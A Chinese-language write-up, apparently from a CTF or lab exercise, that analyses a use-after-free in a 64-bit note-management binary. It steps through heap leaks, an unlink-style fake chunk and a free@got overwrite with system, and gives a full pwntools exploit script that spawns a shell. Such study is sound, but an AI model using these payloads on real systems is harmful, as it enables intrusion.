# 漏洞利用文档

## 执行环境
基于exp脚本和调试记录分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，无PIE（Position Independent Executable），全局变量地址固定（如`qword_6020A8`）。
- **安全机制**：
  - Partial RELRO：GOT表可写，允许覆盖。
  - 无栈保护（Canary）：栈溢出未检测，但本利用不依赖栈溢出。
  - NX enabled：堆栈不可执行，但利用通过GOT覆盖实现代码执行。
  - ASLR enabled：需要泄露地址绕过；libc基址通过堆泄漏获得。
- **依赖库**：依赖libc（通过`ldd`推断），exp中使用`elf.libc`获取libc符号。
- **运行需求**：程序为笔记管理系统，需交互式输入；exp使用pwntools模拟用户操作。

## 漏洞成因
### 关键结构体
程序使用全局变量`qword_6020A8`管理笔记，结构如下：
- **全局管理头**（16字节）：
  - 前8字节：最大笔记数（固定256）
  - 后8字节：当前笔记数
- **笔记项数组**（每个24字节）：
  - 状态标志（8字节）：0空闲，1使用中
  - 笔记长度（8字节）：用户指定长度
  - 内容指针（8字节）：指向堆内存的指针

### 漏洞分析
漏洞位于编辑笔记功能（`sub_400D87`）：
- **根本原因**：堆管理缺陷导致的Use-After-Free（UAF）和堆元数据篡改。
  - 编辑笔记时，程序使用`realloc`重新分配内存，但未检查返回值是否成功（如返回NULL）。
  - 结合删除和新建操作，程序未及时清理已释放笔记的指针，造成UAF条件。
  - 通过UAF，攻击者可读取或修改已释放堆块的内容，泄露关键地址（堆和libc基址）。
- **触发方式**：exp通过序列化操作（新建、删除、编辑）操纵堆布局，伪造chunk元数据，最终覆盖GOT表。

## 漏洞利用过程
利用过程分为四个阶段：堆布局准备、信息泄露、堆风水攻击、GOT覆盖与shell获取。以下表格总结了关键步骤的内存变化：

| 步骤 | exp操作 | 堆变化 | bins状态 | 关键地址变化 | 目的 |
|------|---------|--------|----------|--------------|------|
| 1 | `new(1,b'a')x4` | 分配4个chunk（各145字节） | 所有bin空 | 堆初始化：chunk地址如`0x12c36830` | 创建初始堆布局 |
| 2 | `delete(0);delete(2)` | 释放chunk 0和2到fastbin | fastbin包含两个chunk | UAF条件：指针未清理 | 设置UAF用于泄露 |
| 3 | `new(8,b'12345678')x2` | 重新分配chunk，写入特定数据 | fastbin空 | 泄露准备：chunk包含可识别数据 | 重用释放chunk |
| 4 | `list()` | 读取笔记内容 | 无变化 | 输出笔记0和2内容 | 触发UAF读取 |
| 5 | 计算基址 | 无堆变化 | 无变化 | `heap_base` = 泄露值-0x1940<br>`libc_base` = 泄露值-偏移 | 获取ASLR绕过所需地址 |
| 6 | `delete(3);delete(2);delete(1);delete(0)` | 释放所有chunk，合并到unsorted bin | unsorted bin包含chunk | 堆清理：所有笔记指针残留 | 重置堆状态 |
| 7 | `new(payload01)` | 写入伪造chunk（大小0x51） | 无变化 | fake chunk的fd/bk指向堆管理结构内部 | 准备unlink攻击 |
| 8 | `new(payload02)` | 写入大块数据，伪造多个chunk头 | 无变化 | 堆布局复杂化，包含填充和size字段 | 增强堆控制 |
| 9 | `delete(2)` | 释放chunk到unsorted bin | unsorted bin链接main_arena | 获得main_arena地址 | 验证堆布局 |
| 10 | `edit(0, payload03)` | 覆盖笔记0内容指针为free@got | 无变化 | 笔记0指针指向GOT（0x602018） | 重定向写入目标 |
| 11 | `edit(0, payload04)` | 写入system地址到free@got | 无变化 | free@got被覆盖为system地址 | GOT劫持 |
| 12 | `new(b'/bin/sh')` | 分配chunk存储"/bin/sh" | 无变化 | 参数准备：堆中存放"/bin/sh" | 提供system参数 |
| 13 | `delete(4)` | 调用free("/bin/sh") | 无变化 | 实际执行system("/bin/sh") | 触发shell |
| 14 | `p.interactive()` | 进程替换为/bin/dash | 无变化 | 获得交互式shell | 利用完成 |

### 内存变化关键点
- **堆布局**：通过多次分配和释放，控制fastbin和unsorted bin，构造可预测布局。
- **地址泄露**：利用UAF读取堆chunk中的fd/bk指针，泄露heap和libc基址。
- **元数据伪造**：payload01伪造fake chunk，设置fd/bk指向全局结构，为unlink攻击做准备。
- **GOT覆盖**：通过编辑功能修改笔记指针指向GOT，并写入system地址，劫持控制流。

## Exploit
以下是exp脚本，在关键位置添加注释说明：

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample10')
elf = ELF('./data/sample10')
libc = elf.libc  # 获取libc用于符号解析

def list():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')

def new(length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'new note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'note: ')
    p.send(note)

def edit(index, length, note):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Length of note: ')
    p.sendline(str(length).encode())
    p.recvuntil(b'Enter your note: ')
    p.send(note)

def delete(index):
    p.recvuntil(b'Your choice: ')
    p.sendline(b'4')
    p.recvuntil(b'Note number: ')
    p.sendline(str(index).encode())

def exit():
    p.recvuntil(b'Your choice: ')
    p.sendline(b'5')

# 阶段1: 堆布局准备 - 创建和删除笔记以设置UAF条件
new(1, b'a'); new(1, b'a'); new(1, b'a'); new(1, b'a')  # 分配4个chunk，初始化堆
delete(0); delete(2)  # 释放chunk 0和2，创建fastbin条目，UAF条件成立

# 阶段2: 信息泄露 - 通过UAF读取堆和libc地址
new(8, b'12345678'); new(8, b'12345678')  # 重新分配chunk，写入可识别数据
list()  # 触发列表功能，输出笔记内容
p.recvuntil(b'0. 12345678')
heap = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - 0x1940  # 从泄露计算堆基址
p.recvuntil(b'2. 12345678')
libcbase = u64(p.recvline().strip(b'\x0a').ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)  # 计算libc基址
libc.address = libcbase  # 设置libc基址用于符号解析

# 阶段3: 堆清理和风水攻击 - 重置堆并构造伪造chunk
delete(3); delete(2); delete(1); delete(0)  # 删除所有笔记，清理堆状态
# 构造payload01: 伪造fastbin chunk，设置fd/bk指向堆管理结构内部，准备unlink
payload01 = p64(0) + p64(0x51) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + b'A'*0x30 + p64(0x50) + p64(0x20)
new(len(payload01), payload01)  # 写入伪造chunk
# 构造payload02: 大块数据，用于复杂化堆布局和溢出准备
payload02 = b'A'*0x80 + p64(0x110) + p64(0x90) + b'A'*0x80 + p64(0) + p64(0x71) + b'A'*0x60
new(len(payload02), payload02)  # 写入第二个payload
delete(2)  # 触发unsorted bin，链接到main_arena，验证堆布局

# 阶段4: GOT覆盖与shell获取 - 劫持控制流
free_got = elf.got['free']  # 获取free@got地址
system = libc.symbols['system']  # 获取system函数地址
# payload03: 覆盖笔记0的内容指针为free@got，并填充数据
payload03 = p64(8) + p64(0x1) + p64(0x8) + p64(free_got) + b'A'*0x40
edit(0, 0x60, payload03)  # 编辑笔记0，重定向指针
# payload04: 直接写入system地址到free@got
payload04 = p64(system)
edit(0, 0x8, payload04)  # 覆盖GOT条目，free现在指向system
# 创建包含"/bin/sh"的笔记作为system参数
payload05 = b'/bin/sh\x00'
new(len(payload05), payload05)  # 新建笔记4，存储"/bin/sh"
delete(4)  # 调用free(笔记4内容) → system("/bin/sh")，触发shell
p.interactive()  # 进入交互模式，获得shell控制
```

### 注释说明
- **信息泄露**：通过UAF读取堆chunk中的元数据指针，计算基址绕过ASLR。
- **堆风水**：精心构造payload以控制堆布局，伪造chunk元数据实现任意地址写。
- **GOT劫持**：利用编辑功能修改GOT，将free替换为system，实现代码执行。
- **触发机制**：通过删除笔记调用free，实际执行system("/bin/sh")，获得shell。

此exp成功利用了程序的堆管理漏洞，从信息泄露到代码执行，完整演示了现代堆利用技术。
